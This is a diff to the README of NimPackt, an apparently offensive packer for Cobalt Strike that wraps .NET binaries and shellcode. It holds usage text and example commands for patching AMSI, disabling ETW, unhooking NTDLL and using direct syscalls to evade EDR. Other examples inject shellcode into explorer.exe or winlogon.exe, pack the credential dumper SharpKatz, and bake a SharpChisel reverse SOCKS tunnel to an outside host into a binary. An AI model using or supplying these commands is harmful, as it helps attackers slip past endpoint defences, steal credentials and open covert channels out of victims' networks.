@@ -50,48 +50,47 @@ To install the CobaltStrike plugin, select `Cobalt Strike` -> `Script Manager` f
 ## Usage
 
 ```
-usage: NimPackt.py [-h] -e EXECUTIONMODE -i INPUTFILE [-a ARGUMENTS] [-na]
-                   [-ne] [-r] [-t INJECTTARGET] [-E] [-nu] [-ns] [-f FILETYPE]
-                   [-s] [-32] [-H] [-d] [-v] [-V]
+usage: NimPackt.py [-h] -e EXECUTIONMODE -i INPUTFILE [-a ARGUMENTS] [-na] [-ne] [-r]
+                   [-t INJECTTARGET] [-E] [-o OUTPUTFILE] [-nu] [-ns] [-f FILETYPE] [-s] [-32]
+                   [-S] [-d] [-v] [-V]
 
 required arguments:
   -e EXECUTIONMODE, --executionmode EXECUTIONMODE
-                        Execution mode of the packer. Supports "execute-
-                        assembly" or "shinject"
+                        Execution mode of the packer. Supports "execute-assembly" or
+                        "shinject"
   -i INPUTFILE, --inputfile INPUTFILE
-                        C# .NET binary executable (.exe) or shellcode (.bin)
-                        to wrap
+                        C# .NET binary executable (.exe) or shellcode (.bin) to wrap
 
 execute-assembly arguments:
   -a ARGUMENTS, --arguments ARGUMENTS
-                        Arguments to "bake into" the wrapped binary, or
-                        "PASSTHRU" to accept run-time arguments (default)
-  -na, --nopatchamsi    Do NOT patch (disable) the Anti-Malware Scan Interface
-                        (AMSI)
+                        Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept
+                        run-time arguments (default)
+  -na, --nopatchamsi    Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)
   -ne, --nodisableetw   Do NOT disable Event Tracing for Windows (ETW)
 
 shinject arguments:
   -r, --remote          Inject shellcode into remote process (default false)
   -t INJECTTARGET, --target INJECTTARGET
-                        Remote thread targeted for remote process injection
-                        (default "explorer.exe", implies -r)
-  -E, --existing        Remote inject into existing process rather than a
-                        newly spawned one (default false, implies -r)
-                        (WARNING: VOLATILE)
+                        Remote thread targeted for remote process injection (default
+                        "explorer.exe", implies -r)
+  -E, --existing        Remote inject into existing process rather than a newly spawned one
+                        (default false, implies -r) (WARNING: VOLATILE)
 
 other arguments:
-  -nu, --nounhook       Do NOT unhook user-mode API hooks in the target
-                        process by loading a fresh NTDLL.dll
-  -ns, --nosyscalls     Do NOT use direct syscalls (Windows generation 7-10)
-                        instead of high-level APIs to evade EDR
+  -o OUTPUTFILE, --outfile OUTPUTFILE
+                        Filename of the output file (e.g. "LegitBinary"). Specify WITHOUT
+                        extension or path. This property will be stored in the output binary
+                        as the original filename
+  -nu, --nounhook       Do NOT unhook user-mode API hooks in the target process by loading a
+                        fresh NTDLL.dll
+  -ns, --nosyscalls     Do NOT use direct syscalls (Windows generation 7-10) instead of high-
+                        level APIs to evade EDR
   -f FILETYPE, --filetype FILETYPE
                         Filetype to compile ("exe" or "dll", default: "exe")
   -s, --sleep           Sleep for approx. 30 seconds by calculating primes
   -32, --32bit          Compile in 32-bit mode (untested)
-  -H, --hideapp         Hide the app frontend (console output) of executable
-                        by compiling it in GUI mode
-  -d, --debug           Enable debug mode (retains .nim source file in output
-                        folder).
+  -S, --showConsole     Show a console window with the app's output when running
+  -d, --debug           Enable debug mode (retains .nim source file in output folder)
   -v, --verbose         Print debug messages of the wrapped binary at runtime
   -V, --version         show program's version number and exit
 ```
@@ -99,21 +98,21 @@ other arguments:
 **Examples:**
 
 ```bash
-# Pack SharpKatz to accept arguments at runtime, patching NTDLL hooks, AMSI, and ETW while printing verbose messages at runtime
-python3 ./NimPackt.py -e execute-assembly -i bins/SharpKatz-x64.exe -v
+# Pack SharpKatz to accept arguments at runtime, patching NTDLL hooks, AMSI, and ETW while printing verbose messages to a visible console at runtime
+python3 ./NimPackt.py -e execute-assembly -i bins/SharpKatz-x64.exe -S -v
 
 # Pack Seatbelt as a DLL file with baked-in arguments (note: write to outfile because stdout is not available for DLLs)
 python3 ./NimPackt.py -f dll -e execute-assembly -i Seatbelt.exe -a "-group=all -outputfile=c:\users\public\downloads\sb.txt"
 
 # Pack SharpChisel with a built-in ChiselChief connection string, do not unhook, patch AMSI, or disable ETW, hide the application window at runtime
-python3 NimPackt.py -nu -na -ne -H -e execute-assembly -i bins/SharpChisel.exe -a 'client --auth nimpackt.demo_A:718nubCpwiuLUW --keepalive 25s --max-retry-interval 25s https://chisel.azurewebsites.net R:10073:socks'
+python3 NimPackt.py -nu -na -ne -e execute-assembly -i bins/SharpChisel.exe -a 'client --auth nimpackt.demo_A:718nubCpwiuLUW --keepalive 25s --max-retry-interval 25s https://chisel.azurewebsites.net R:10073:socks'
 
 # Pack raw shellcode to DLL file that executes in the local thread through direct syscalls, unhooking NTDLL as well
 # Shellcode generated with 'msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o /tmp/calc.bin'
 python3 NimPackt.py -i calc.bin -e shinject -f dll
 
-# Pack raw shellcode to execute in a newly spawned Explorer thread in an invisible window, enabling verbose log messages in the compiled Nim binary
-python3 NimPackt.py -i calc.bin -e shinject -r -H -v
+# Pack raw shellcode to execute in a newly spawned Explorer thread in an invisible window
+python3 NimPackt.py -i calc.bin -e shinject -r
 
 # Pack raw shellcode to execute in the existing Winlogon process (first PID with name 'winlogon.exe'), do not use direct syscalls or unhook NTDLL
 python3 NimPackt.py -i calc.bin -e shinject -r -E -t "winlogon.exe" -nu -ns
